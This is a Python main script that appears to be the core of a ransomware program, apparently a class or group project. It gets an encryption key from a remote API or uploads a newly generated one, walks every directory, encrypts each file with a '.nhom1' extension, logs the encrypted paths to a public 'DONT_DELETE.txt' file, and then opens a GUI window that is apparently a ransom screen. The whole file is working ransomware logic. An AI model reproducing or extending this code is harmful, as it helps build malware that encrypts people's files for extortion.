import screens.home_screen as home_screen
import services.get_dirs as get_dirs
import services.api_services as api
import encrypt.encrypt_file as enc
import os


# get all dirs
all_dirs = get_dirs.get_all_dirs()
DONT_DELETE = 'C:\\Users\\Public\\Documents\\DONT_DELETE.txt'
all_files_enc = open(DONT_DELETE, '+a')

# api to connect data retool
node = api.get_node()

# get key from data
key = api.get_key(node=node)

if key == 'NA':
  key = enc.get_key()
  status = api.post_key(node=node, key=key)
  print(status)
else:
  for direc in all_dirs:
    for root, _, filenames in os.walk(direc):
      for filename in filenames:
        file_path = os.path.join(root, filename)
        if file_path.endswith('.nhom1'):
          all_files_enc.write(str(file_path) + '.enc' + '\n')
          enc.enc(key=key, filename=file_path)

all_files_enc.close()
home_screen = home_screen.main_window
home_screen.mainloop()